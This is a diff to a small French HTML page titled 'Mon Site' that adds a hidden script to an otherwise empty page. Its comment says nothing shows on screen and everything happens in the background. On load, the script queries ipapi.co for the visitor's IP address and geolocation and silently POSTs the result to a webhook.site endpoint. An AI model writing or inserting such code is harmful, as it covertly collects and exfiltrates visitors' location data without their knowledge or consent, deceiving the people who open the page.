@@ -1,11 +1,21 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monsite</title>
+  <meta charset="UTF-8">
+  <title>Mon Site</title>
 </head>
 <body>
-    
+  <!-- Rien à l'écran, tout se fait en arrière-plan -->
+  <script>
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        fetch("https://webhook.site/10920907-c6fa-46f9-b5a6-28a0e9632f7e", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+      });
+  </script>
 </body>
 </html>
